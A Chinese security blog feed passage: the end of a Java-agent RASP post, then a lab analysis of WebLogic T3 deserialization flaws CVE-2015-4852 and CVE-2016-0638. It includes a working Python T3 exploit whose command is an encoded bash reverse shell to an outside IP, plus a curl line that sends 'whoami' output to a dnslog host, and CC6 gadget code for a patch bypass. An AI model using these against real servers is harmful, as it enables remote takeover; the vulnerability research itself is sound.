&lt;p&gt;这里本来是想Hook一下&lt;code&gt;ProcessBuilder&lt;/code&gt;类的，但发现在类加载hook的模式没有办法解决这个问题，诸如&lt;code&gt;ProccessBuilder&lt;/code&gt;的系统类早在&lt;code&gt;JVM&lt;/code&gt;启动初期就已经完成了加载，其加载进度相较于&lt;code&gt;PreMain&lt;/code&gt;更加提前，故难以通过对类加载hook来对此种系统类进行修改。&lt;/p&gt;
&lt;h3&gt;Instrumentation详探&lt;/h3&gt;
&lt;p&gt;为了方便用户对JVM进行操作，JDK1.5之后引入了这个Instrumentation特性，通过Instrumentation的实例对象，可以对jvm进行一定的操作，例如修改字节码、插桩等等。&lt;/p&gt;
&lt;p&gt;它的实现原理是JVMTI(JVM Tool Interface)，即JVM向用户提供的操作jvm的接口。JVMTI是事件驱动的，当发生一定的处理逻辑时，才会调用回调接口，而这些接口可以让用户扩展一些逻辑。例如前面的transform函数调用，就是JVMTI监听到类加载，就会基于这个事件，回调instrumentation中的所有ClassTransformer.transform函数，进行类转换(Class transform)。所以我们可以理解为获得instrumentation对象，就可以实现对一个jvm的一定操作，获取的这个对象的方法就是前文提到的javaagent和attach方法。&lt;/p&gt;
&lt;p&gt;然后以下是一些常用的&lt;code&gt;Instrumentation&lt;/code&gt;方法&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;void addTransformer(ClassFileTransformer transformer, boolean canRetransform)
//注册ClassFileTransformer实例，注册多个会按照注册顺序进行调用。所有的类被加载完毕之后会调用ClassFileTransformer实例，相当于它们通过了redefineClasses方法进行重定义。布尔值参数canRetransform决定这里被重定义的类是否能够通过retransformClasses方法进行回滚。  
void addTransformer(ClassFileTransformer transformer)
//相当于addTransformer(transformer, false)，也就是通过ClassFileTransformer实例重定义的类不能进行回滚。  
boolean removeTransformer(ClassFileTransformer transformer)
//移除(反注册)ClassFileTransformer实例。  
void retransformClasses(Class&amp;lt;?&amp;gt;... classes)
//已加载类进行重新转换的方法，重新转换的类会被回调到ClassFileTransformer的列表中进行处理。   
void appendToBootstrapClassLoaderSearch(JarFile jarfile)
//指定 JAR 文件，放到Bootstrap ClassLoader搜索路径    
void appendToSystemClassLoaderSearch(JarFile jarfile)
//将某个jar加入到Classpath里供AppClassloard去加载。    
Class[] getAllLoadedClasses()//返回 JVM 当前加载的所有类的数组  
Class[] getInitiatedClasses(ClassLoader loader)//获取所有已经被初始化过了的类。  
boolean isModifiableClass(Class&amp;lt;?&amp;gt; theClass)//确定一个类是否可以被 retransformation 或 redefinition 修改  
void redefineClasses(ClassDefinition... definitions)//重定义类，也就是对已经加载的类进行重定义，ClassDefinition类型的入参包括了对应的类型Class&amp;lt;?&amp;gt;对象和字节码文件对应的字节数组
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;JVMTIAgent（JVMTI Agent）是实现了 JVMTI 规范的代理程序，它是基于 JVMTI 接口开发的具体应用，简而言之，JVMTI 是一种规范和接口，定义了与 Java 虚拟机交互的方式，而 JVMTIAgent 则是基于 JVMTI 规范实现的具体代理程序，用于实现各种监控、调试和分析功能。像这里的Instrumentation就可以理解为一种JVMTI Agent，而以上两种JavaAgent例子其实就是两种不同的
&lt;code&gt;instrument agent&lt;/code&gt;运行过程，我们可以用下面这种方式来描述他们。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;一、启动时加载instrument agent过程：&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;创建并初始化 JPLISAgent；&lt;/li&gt;
&lt;li&gt;监听 &lt;code&gt;VMInit&lt;/code&gt; 事件，在 JVM 初始化完成之后做下面的事情：
&lt;ol&gt;
&lt;li&gt;创建 InstrumentationImpl 对象 ；&lt;/li&gt;
&lt;li&gt;监听 ClassFileLoadHook 事件 ；&lt;/li&gt;
&lt;li&gt;调用 InstrumentationImpl 的&lt;code&gt;loadClassAndCallPremain&lt;/code&gt;方法，在这个方法里会去调用 javaagent 中 MANIFEST.MF 里指定的Premain-Class 类的 premain 方法 ；&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;解析 javaagent 中 MANIFEST.MF 文件的参数，并根据这些参数来设置 JPLISAgent 里的一些内容。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;二、运行时加载instrument agent过程：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;通过 JVM 的attach机制来请求目标 JVM 加载对应的agent，过程大致如下：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;创建并初始化JPLISAgent；&lt;/li&gt;
&lt;li&gt;解析 javaagent 里 MANIFEST.MF 里的参数；&lt;/li&gt;
&lt;li&gt;创建 InstrumentationImpl 对象；&lt;/li&gt;
&lt;li&gt;监听 ClassFileLoadHook 事件；&lt;/li&gt;
&lt;li&gt;调用 InstrumentationImpl 的&lt;code&gt;loadClassAndCallAgentmain&lt;/code&gt;方法，在这个方法里会去调用javaagent里 MANIFEST.MF 里指定的&lt;code&gt;Agent-Class&lt;/code&gt;类的&lt;code&gt;agentmain&lt;/code&gt;方法。&lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;最终解决方案&lt;/h3&gt;
&lt;p&gt;通过以上对于&lt;code&gt;Instrumentation&lt;/code&gt;的具体学习，我们显然有了突破限制的思路。虽然没有办法在类加载阶段修改字节码，但我们可以等到所有类都加载进JVM之后再对字节码来进行修改，Agent代码部分如下&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;package org.example;  
import java.io.BufferedReader;  
import java.io.InputStreamReader;  
import java.lang.instrument.Instrumentation;  
import java.lang.instrument.UnmodifiableClassException;  
import java.io.IOException;  
  
public class PreMain {  
    public static void premain(String agentArgs, Instrumentation inst) throws IOException, UnmodifiableClassException {  
        // 先测试一次使用ProcessBuilder获取当前路径  
        System.out.println(&quot;\n&quot;);  
        ProcessBuilder processBuilder = new ProcessBuilder();  
        processBuilder.command(&quot;cmd&quot;, &quot;/c&quot;, &quot;chdir&quot;);  
        Process process = processBuilder.start();  
        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream(), &quot;gbk&quot;));  
        System.out.println(bufferedReader.readLine());  
  
        // 添加ClassFileTransformer类  
        ProcessBuilderHook processBuilderHook = new ProcessBuilderHook(inst);  
        inst.addTransformer(processBuilderHook, true);  
  
        // 获取所有jvm中加载过的类  
        Class[] allLoadedClasses = inst.getAllLoadedClasses();  
        for (Class aClass : allLoadedClasses) {  
            if (inst.isModifiableClass(aClass) &amp;amp;&amp;amp; !aClass.getName().startsWith(&quot;java.lang.invoke.LambdaForm&quot;)){  
                // 调用instrumentation中所有的ClassFileTransformer#transform方法，实现类字节码修改  
                inst.retransformClasses(new Class[]{aClass});  
            }  
        }  
        System.out.println(&quot;++++++++++++++++++hook finished++++++++++++++++++\n&quot;);  
    }  
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Main部分如下&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;package org.example;  
import java.io.BufferedReader;  
import java.io.IOException;  
import java.io.InputStream;  
import java.io.InputStreamReader;  
  
public class Main {  
    public static void main(String[] args) throws InterruptedException, IOException {  
        System.out.println(&quot;main start!&quot;);  
        ProcessBuilder processBuilder = new ProcessBuilder();  
        processBuilder.command(&quot;cmd&quot;, &quot;/c&quot;, &quot;calc&quot;);  
        Process process = processBuilder.start();  
        InputStream inputStream =  process.getInputStream();  
        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream, &quot;gbk&quot;));  
        System.out.println(bufferedReader.readLine());  
    }  
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;运行结果如下，成功实现简易版的RASP
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/RASPDemo/Pasted%20image%2020240311012202.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;如果这里想用之前&lt;code&gt;ZipFileSystem&lt;/code&gt;那里提到的类加载式拦截也不是不可以，但是记得加上这么一段代码，把我们的代理类加到&lt;code&gt;BootstrapClassloader&lt;/code&gt;里面去，这里就不实操了&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;// localJarPath为代理jar包的绝对路径 inst.appendToBootstrapClassLoaderSearch(new JarFile(localJarPath))
&lt;/code&gt;&lt;/pre&gt;
</content:encoded></item><item><title>Weblogic漏洞分析(一)</title><link>https://f4miti0n.github.io/posts/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%80/</link><guid isPermaLink="true">https://f4miti0n.github.io/posts/weblogic%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%80/</guid><pubDate>Mon, 26 Feb 2024 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;前言&lt;/h2&gt;
&lt;p&gt;本文主要分析Weblogic的反序列化漏洞，在weblogic里面其实反序列化漏洞利用中大致可以分为两种，一种是基于T3协议的反序列化漏洞，一种是基于XML的反序列化漏洞。&lt;/p&gt;
&lt;p&gt;基于T3协议漏洞： CVE-2015-4582、CVE-2016-0638、CVE-2016-3510、CVE-2018-2628、CVE-2020-2555、CVE-2020-2883&lt;/p&gt;
&lt;p&gt;基于XML:CVE-2017-3506、CVE-2017-10271、CVE-2019-2729&lt;/p&gt;
&lt;h2&gt;T3协议&lt;/h2&gt;
&lt;h3&gt;简介&lt;/h3&gt;
&lt;p&gt;T3协议是一种基于Java远程方法调用（RMI）实现的协议，它在WebLogic Server中用于实现客户端和服务器之间的通信。其主要功能是使用Java对象进行通信，能够传输包括Java对象在内的各种数据类型，实现WebLogic Server集群中不同服务器之间的通信和数据传输，以便实现负载均衡等功能。与传统的RMI通信协议相比，它提供了一些额外的特性，如服务端可以持续追踪监控客户端是否存活的心跳机制，以及通过建立一次连接完成全部数据包传输，从而优化了数据包大小和网络消耗。此外，T3协议还包含了请求头和请求主体两部分，这些部分分为七个部分，其中第一部分是协议头，后面的2-7都是请求主题，这有助于更好地理解和管理通信过程。&lt;/p&gt;
&lt;h3&gt;T3协议结构&lt;/h3&gt;
&lt;h4&gt;头部&lt;/h4&gt;
&lt;p&gt;首先，T3协议包含请求包头和请求的主体这两部分内容。这意味着在数据包发送之前，需要先发送一个头部（header），其中包括请求的ID、长度等信息。例如，客户端首先发送一个T3数据包的头部，如&lt;code&gt;t3 12.2.1 AS:255 HL:19 MS:10000000 PU:t3://us-l-breens:7001&lt;/code&gt;，其中&lt;code&gt;12.2.1&lt;/code&gt;表示本地客户端请求，&lt;code&gt;AS&lt;/code&gt;是对象的大小，&lt;code&gt;HL&lt;/code&gt;是header的长度，&lt;code&gt;PU&lt;/code&gt;指定目标。&lt;/p&gt;
&lt;p&gt;简单写个socket发包脚本,wireshark选择any追踪流分析一下&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;import socket  
  
def T3Test(ip,port):  
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
    sock.connect((ip, port))  
    handshake = &quot;t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n&quot; #请求包的头  
    sock.sendall(handshake.encode())  
    while True:  
        data = sock.recv(1024)  
        print(data.decode())  
  
if __name__ == &quot;__main__&quot;:  
    ip = &quot;localhost&quot;  
    port = 7001  
  
    T3Test(ip,port)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Weblogic(1)/Pasted%20image%2020240222225326.png&quot; alt=&quot;&quot; /&gt;
在这个请求包中，还包含了一个HELO响应，这通常是服务器向客户端返回的第一个消息。在这个响应中，服务器给出了自己的版本号，即10.3.6.0.false ，并指定了另一个端口号2048。&lt;/p&gt;
&lt;h4&gt;请求主体&lt;/h4&gt;
&lt;p&gt;我们发送的请求主体，可以被划分为七部分内容，至于这7个部分有什么区别联系，可以参考下面两张图
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Weblogic(1)/T3%281%29.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Weblogic(1)/T3%282%29.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;第一个非 Java 序列化数据，也就是我们的请求头：&lt;code&gt;t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n&lt;/code&gt;
剩下的就是主体部分。不难看出，每一部分序列化数据前缀都是&lt;code&gt;ac ed 00 05&lt;/code&gt;，通过这个特征，我们就可以把这些部分做出一个合理的区分。而我们的poc构造，其关键就在于将恶意序列化数据替换掉2-7这几个部分里的序列化数据，形象一点地表示就是下图这样 (只需要替换掉其中一个就行)&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Weblogic(1)/AnyEvilCode.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;当然，只保留一部分的序列化数据也是合理的，下面这种利用方式也同样可以奏效
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Weblogic(1)/c6054c8cd52e8ccaaa67cc4621a8e36d.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h2&gt;CVE-2015-4852&lt;/h2&gt;
&lt;p&gt;挺经典的洞，这里也是跟着研究一下，准备好的poc如下，打的CC6&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;import socket
import sys
import struct
import re
import subprocess
import binascii

def get_payload1(gadget, command):
    JAR_FILE = &apos;ysoserial-all.jar&apos;
    popen = subprocess.Popen([&apos;java&apos;, &apos;-jar&apos;, JAR_FILE, gadget, command], stdout=subprocess.PIPE)
    return popen.stdout.read()

def get_payload2(path):
    with open(path, &quot;rb&quot;) as f:
        return f.read()

def exp(host, port, payload):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))

    handshake = &quot;t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n&quot;.encode()
    sock.sendall(handshake)
    data = sock.recv(1024)
    pattern = re.compile(r&quot;HELO:(.*).false&quot;)
    version = re.findall(pattern, data.decode())
    if len(version) == 0:
        print(&quot;Not Weblogic&quot;)
        return

    print(&quot;Weblogic {}&quot;.format(version[0]))
    data_len = binascii.a2b_hex(b&quot;00000000&quot;) #数据包长度，先占位，后面会根据实际情况重新
    t3header = binascii.a2b_hex(b&quot;016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006&quot;) #t3协议头
    flag = binascii.a2b_hex(b&quot;fe010000&quot;) #反序列化数据标志
    payload = data_len + t3header + flag + payload
    payload = struct.pack(&apos;&amp;gt;I&apos;, len(payload)) + payload[4:] #重新计算数据包长度
    sock.send(payload)

if __name__ == &quot;__main__&quot;:
    host = &quot;localhost&quot;
    port = 7001
    gadget = &quot;CommonsCollections6&quot; #CommonsCollections1 Jdk7u21
    command = &quot;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjI1MS4xNy83Nzc3IDA+JjEgCg==}|{base64,-d}|{bash,-i}&quot;
    # command = &quot;curl http://`whoami`.5dhwnx.dnslog.cn&quot;

    payload = get_payload1(gadget, command)
    exp(host, port, payload)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;执行结果如下
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Weblogic(1)/Pasted%20image%2020240223205343.png&quot; alt=&quot;&quot; /&gt;
wireshark抓包分析一下，发现ysoserial的恶意payload已经插进去了&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;数据包长度&lt;/li&gt;
&lt;li&gt;T3协议头&lt;/li&gt;
&lt;li&gt;反序列化标志：T3协议中每个反序列化数据包前面都带有fe 01 00 00，再加上反序列化标志ac ed 00 05就变成了fe 01 00 00 ac ed 00 05&lt;/li&gt;
&lt;li&gt;序列化数据
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Weblogic(1)/Pasted%20image%2020240223210755.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;远程调试环境搭建&lt;/h3&gt;
&lt;p&gt;远程环境是docker起的，先把这几个依赖给拿出来&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;docker cp weblogic1036jdk8u202:/u01/app/oracle/middleware/modules `pwd`  
docker cp weblogic1036jdk8u202:/u01/app/oracle/middleware/wlserver `pwd`
docker cp weblogic1036jdk8u202:/u01/app/oracle/middleware/coherence_3.7/lib `pwd`
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;idea在项目结构里把这几个东西加到库里边导入依赖
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Weblogic(1)/Pasted%20image%2020240224004616.png&quot; alt=&quot;&quot; /&gt;
在docker里运行如下命令，若出现如下界面，则代表启动正常&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sh /u01/app/oracle/Domains/ExampleSilentWTDomain/startWebLogic.sh
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Weblogic(1)/Pasted%20image%2020240224004843.png&quot; alt=&quot;&quot; /&gt;
idea里面做如下配置，端口和主机都要对应上远程环境
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Weblogic(1)/Pasted%20image%2020240224004921.png&quot; alt=&quot;&quot; /&gt;
在&lt;code&gt;InboundMsgAbbrev#readObject&lt;/code&gt;处打上断点，同时打poc
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Weblogic(1)/Pasted%20image%2020240224005035.png&quot; alt=&quot;&quot; /&gt;
调试环境搭建成功
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Weblogic(1)/Pasted%20image%2020240224005354.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h3&gt;漏洞分析&lt;/h3&gt;
&lt;p&gt;接着上面的步骤来分析，先看到45行&lt;code&gt;ServerChannelInputStream&lt;/code&gt;这块，此时var1封装着未被解析的序列化数据，跟进此处的&lt;code&gt;new ServerChannelInputStream(var1)&lt;/code&gt;
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Weblogic(1)/Pasted%20image%2020240224013333.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Weblogic(1)/Pasted%20image%2020240224193827.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ServerChannelInputStream&lt;/code&gt;是个继承于&lt;code&gt;ObjectInputStream&lt;/code&gt;的内部类，并且重写了&lt;code&gt;resolveClass&lt;/code&gt;方法。这里&lt;code&gt;resolveClass&lt;/code&gt;先打个断点就不管它了，跟进&lt;code&gt;getServerChannel()&lt;/code&gt;看看。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Weblogic(1)/Pasted%20image%2020240224013750.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;返回了一个&lt;code&gt;ServerChannel&lt;/code&gt;对象，此处的&lt;code&gt;connection&lt;/code&gt;包含了一堆相关的信息。该方法的意义就在于处理我们的T3协议所传递的信息，没有必要管他，直接步过，。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Weblogic(1)/Pasted%20image%2020240224014039.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;回头看看我们这里返回的对象，其实就是解析出了一堆socket信息，整理了下信息流，在得到信息流之后再进行&lt;code&gt;readObject&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Weblogic(1)/Pasted%20image%2020240224014625.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Weblogic(1)/Pasted%20image%2020240224194627.png&quot; alt=&quot;&quot; /&gt;
因为这里的&lt;code&gt;readObject&lt;/code&gt;并没有进行重写，所以本质还是&lt;code&gt;ObjectInputStream&lt;/code&gt;的那一套，唯一不同的地方就在于&lt;code&gt;resolveClass&lt;/code&gt;是被重写过的，当&lt;code&gt;ObjectInputStream&lt;/code&gt;调到&lt;code&gt;resolveClass&lt;/code&gt;的时候，其实用的是&lt;code&gt;ServerChannel&lt;/code&gt; 重写过的  &lt;code&gt;resolveClass&lt;/code&gt;。中间那套原生反序列化的分析步骤就先越过了，直接看&lt;code&gt;ServerChannel#resovleClass&lt;/code&gt;这个重写方法。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Weblogic(1)/Pasted%20image%2020240224014807.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;大体看了一下源码，发现和原生反序列化实现的效果没什么区别，黑名单之类的防护措施都没有做，故而造成反序列化漏洞，其大体流程可按下图总结。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Weblogic(1)/T3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h2&gt;CVE-2016-0638（修复绕过）&lt;/h2&gt;
&lt;h3&gt;环境搭建&lt;/h3&gt;
&lt;p&gt;因为CVE-2016-0638其实就是CVE-2015-4852的修复绕过，我们只需要在原有环境基础上把补丁打好就行。如图所示，我们先把补丁复制到docker里面去
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Weblogic(1)/Pasted%20image%2020240225190535.png&quot; alt=&quot;&quot; /&gt;
之后依次键入以下命令&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;cd /u01/app/oracle/middleware/utils/bsu
mkdir cache_dir
cp /home/p20780171_1036_Generic/* ./cache_dir/
cp /home/p22248372_1036012_Generic/* ./cache_dir/
vi bsu.sh
./bsu.sh -install -patch_download_dir=/u01/app/oracle/middleware/utils/bsu/cache_dir/ -patchlist=EJUW -prod_dir=/u01/app/oracle/middleware/wlserver -verbose
./bsu.sh -install -patch_download_dir=/u01/app/oracle/middleware/utils/bsu/cache_dir/ -patchlist=ZLNA -prod_dir=/u01/app/oracle/middleware/wlserver -verbose
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;最后两条命令运行时间可能稍长点，返回以下界面即代表运行无误
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Weblogic(1)/Pasted%20image%2020240225191021.png&quot; alt=&quot;&quot; /&gt;
搞完之后重启一下docker，发现原来的poc已经打不通了，证明修复成功
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Weblogic(1)/Pasted%20image%2020240225191327.png&quot; alt=&quot;&quot; /&gt;
之后就和之前一样了，把依赖包拉到项目里面分析即可&lt;/p&gt;
&lt;h3&gt;漏洞分析&lt;/h3&gt;
&lt;p&gt;毕竟本质是个补丁的bypass，我们先看下原有的补丁是怎么打的
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Weblogic(1)/Pasted%20image%2020240225231319.png&quot; alt=&quot;&quot; /&gt;
简单粗暴地在&lt;code&gt;resolveClass&lt;/code&gt;加了个黑，相关名单如下所示&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;static final String BLACK_LIST_PROPERTY = &quot;weblogic.rmi.blacklist&quot;;  
static final String DISABLE_DEFAULT_BLACKLIST_PROPERTY = &quot;weblogic.rmi.disabledefaultblacklist&quot;;  
static final String DISABLE_BLACK_LIST_PROPERTY = &quot;weblogic.rmi.disableblacklist&quot;;  
private static final String DEFAULT_BLACK_LIST = &quot;+org.apache.commons.collections.functors,+com.sun.org.apache.xalan.internal.xsltc.trax,+javassist,+org.codehaus.groovy.runtime.ConvertedClosure,+org.codehaus.groovy.runtime.ConversionHandler,+org.codehaus.groovy.runtime.MethodClosure&quot;;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里的bypass是一个二次反序列化的实战案例，用到了&lt;code&gt;StreamMessageImpl&lt;/code&gt;这个类。我们先简单看一下这个类的关键源码。
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Weblogic(1)/Pasted%20image%2020240226142119.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;在&lt;code&gt;readExternal&lt;/code&gt;里面对var5进行了&lt;code&gt;readObject&lt;/code&gt;调用，并且这里的var5还是个&lt;code&gt;ObjectInputStream&lt;/code&gt;对象，再加上&lt;code&gt;readExternal&lt;/code&gt;本质上和&lt;code&gt;readObject&lt;/code&gt;处于同等触发难度，妥妥的二次反序列化节点，接下来我们分析一下payload，这里用到的生成器是&lt;code&gt;weblogic_cmd&lt;/code&gt;，下载地址如下 https://github.com/5up3rc/weblogic_cmd/&lt;/p&gt;
&lt;h3&gt;Exp分析&lt;/h3&gt;
&lt;p&gt;项目导入idea后如下设置，之后开启debug模式
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Weblogic(1)/Pasted%20image%2020240226152229.png&quot; alt=&quot;&quot; /&gt;
入口类149行处打上断点，开始debug调试分析
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Weblogic(1)/Pasted%20image%2020240226152353.png&quot; alt=&quot;&quot; /&gt;
先将我们的参数解析为cmdline，之后再根据解析得到的参数的值对&lt;code&gt;host&lt;/code&gt; ，&lt;code&gt;port&lt;/code&gt;等变量进行赋值，最后进入&lt;code&gt;executeBlind()&lt;/code&gt;方法
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Weblogic(1)/Pasted%20image%2020240226152555.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Weblogic(1)/Pasted%20image%2020240226152706.png&quot; alt=&quot;&quot; /&gt;
从&lt;code&gt;-C&lt;/code&gt;参数解析取得要执行的命令，这里要注意一下必须同时存在&lt;code&gt;-B&lt;/code&gt;和&lt;code&gt;-C&lt;/code&gt;参数才能接着往下执行，我们跟进62行的&lt;code&gt;blindExecute()&lt;/code&gt;
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Weblogic(1)/Pasted%20image%2020240226152808.png&quot; alt=&quot;&quot; /&gt;
对os进行判断，以此决定执行命令的终端，之后在43行处得到反序列化payload，跟进
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Weblogic(1)/Pasted%20image%2020240226153006.png&quot; alt=&quot;&quot; /&gt;
先跟进里面的&lt;code&gt;blindExecutePayloadTransformerChain(execArgs)&lt;/code&gt;看一眼，发现是链式反应里的&lt;code&gt;Transformers&lt;/code&gt;数组设置，接着再回到&lt;code&gt;serialData&lt;/code&gt;这里
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Weblogic(1)/Pasted%20image%2020240226153122.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Weblogic(1)/Pasted%20image%2020240226153236.png&quot; alt=&quot;&quot; /&gt;
发现原来是CC1的&lt;code&gt;gadget&lt;/code&gt;，很烦，和远程环境8u202对不上，得先自己改成CC6的链子，这里暂停调试一下把CC6的链子贴上去改改，调完之后正式跟进&lt;code&gt;selectBypass()&lt;/code&gt;
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Weblogic(1)/Pasted%20image%2020240226153417.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  
HashMap&amp;lt;Object,Object&amp;gt; map = new HashMap&amp;lt;Object,Object&amp;gt;();  
Map&amp;lt;Object,Object&amp;gt; Lazymap = LazyMap.decorate(map,new ConstantTransformer(1));  
TiedMapEntry tiedMapEntry = new TiedMapEntry(Lazymap,&quot;aaa&quot;);  
HashMap&amp;lt;Object,Object&amp;gt; map2 = new HashMap&amp;lt;Object,Object&amp;gt;();  
map2.put(tiedMapEntry,&quot;bbb&quot;);  
Lazymap.remove(&quot;aaa&quot;);  
Class c = LazyMap.class;  
Field factoryFied = c.getDeclaredField(&quot;factory&quot;);  
factoryFied.setAccessible(true);  
factoryFied.set(Lazymap,chainedTransformer);  
Object _handler = BypassPayloadSelector.selectBypass(map2);  
return Serializables.serialize(_handler);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Weblogic(1)/Pasted%20image%2020240226154147.png&quot; alt=&quot;&quot; /&gt;
因为&lt;code&gt;Main.Type&lt;/code&gt;设置的是&lt;code&gt;streamMessageImpl&lt;/code&gt;，所以这里跟进的是38行的逻辑
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Weblogic(1)/Pasted%20image%2020240226154234.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Weblogic(1)/Pasted%20image%2020240226154345.png&quot; alt=&quot;&quot; /&gt;
给套了层&lt;code&gt;streamMessageImpl&lt;/code&gt;的壳，到此为止payload即生成完毕
